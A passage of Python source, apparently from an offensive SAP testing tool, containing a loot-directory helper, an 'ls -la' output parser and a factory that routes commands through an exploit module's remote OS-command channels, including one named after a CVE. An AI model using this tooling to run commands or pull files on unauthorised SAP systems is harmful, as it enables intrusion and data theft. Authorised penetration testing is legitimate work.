            sid = getattr(self.node, "sid", "unknown")
            ts = time.strftime("%Y%m%d_%H%M%S")
            loot_dir = os.path.join(base, sid, ts)
        os.makedirs(loot_dir, exist_ok=True)
        # Strip any path separators / null bytes from the basename
        basename = os.path.basename(remote_path.replace("\\", "/"))
        basename = re.sub(r"[^A-Za-z0-9._-]", "_", basename) or "download"
        return os.path.join(loot_dir, basename)


# --------------------------------------------------------------------------
# ls -la parser (module-level for unit-testability)
# --------------------------------------------------------------------------

# Handles both ls output styles:
#
# 1. GNU coreutils with --time-style=iso:
#      -rw-r--r-- 1 owner group 12345 2026-08-20T09:00:00 name
#      lrwxrwxrwx 1 owner group    12 2026-08-20T09:00:00 link -> target
#
# 2. Traditional ls (BSD, busybox, or GNU without --time-style):
#      -rw-r--r-- 1 owner group 12345 Aug 20 09:00 name
#      -rw-r--r-- 1 owner group 12345 Aug 20  2025 name
#
# We split on whitespace and figure out the mtime length from the
# token count.  Simpler and more robust than a fat regex.


def _parse_ls_line(line: str) -> Optional[dict]:
    """Parse a single ``ls -la`` line into an entry dict, or None if
    the line is a header (``total 42``), blank, or unparseable."""
    s = line.rstrip()
    if not s:
        return None
    if s.startswith("total "):
        return None
    # Strip a symlink "-> target" suffix up front so it doesn't
    # confuse token counting (e.g. "... mylink -> target").
    if " -> " in s:
        s = s.split(" -> ", 1)[0].rstrip()

    parts = s.split()
    if len(parts) < 7:
        return None
    mode = parts[0]
    if not (mode and mode[0] in "-dlbcps"):
        return None
    # Size is the first purely-numeric token after positions 3-5
    # (positions 1-3 are nlink + owner + group; owner/group can be
    # numeric so we scan by position).  For standard ls the size
    # sits at parts[4].
    try:
        size = int(parts[4])
    except (ValueError, IndexError):
        return None

    # Detect mtime span:
    #   ISO:         parts[5] contains "T" or "-" → 1 token
    #   Traditional: parts[5] is a month name → 3 tokens (Mon DD HH:MM|YYYY)
    if "T" in parts[5] or "-" in parts[5]:
        mtime_tokens = 1
    else:
        mtime_tokens = 3
    name_start = 5 + mtime_tokens
    if len(parts) < name_start + 1:
        return None
    mtime = " ".join(parts[5:name_start])
    # Rejoin the remaining tokens so filenames with spaces survive.
    name = " ".join(parts[name_start:])

    if name in (".", ".."):
        return None
    return {
        "name":   name,
        "size":   size,
        "is_dir": mode[0] == "d",
        "mtime":  mtime,
        "mode":   mode,
    }


# --------------------------------------------------------------------------
# Convenience factory — build an ExecFn from a SAPNode + Credentials
# --------------------------------------------------------------------------

def make_exec_fn_from_node(node, creds=None,
                            prefer: str = "") -> ExecFn:
    """Return an ExecFn that delegates every call to
    :func:`sapmap_exploit.execute_os_command`.

    This is what GUI handlers use — they have a node + creds in
    scope and want an ExecFn without threading channel selection
    through the call site.  ``execute_os_command`` internally picks
    the best available channel (CTCWebService > SXPG-auth > GW
    SAPXPG > SAPControl > CVE-31324 JSP) so the TargetFS caller
    gets multi-channel dispatch for free.

    Kept as a factory (not a bound method) so TargetFS itself has
    no dependency on sapmap_exploit at import time — the module
    stays testable with a plain mock ExecFn.
    """
    from sapmap_exploit import execute_os_command

    def _fn(program: str, args: str) -> dict:
        return execute_os_command(node, program, args,
                                    creds=creds, prefer=prefer)
    return _fn
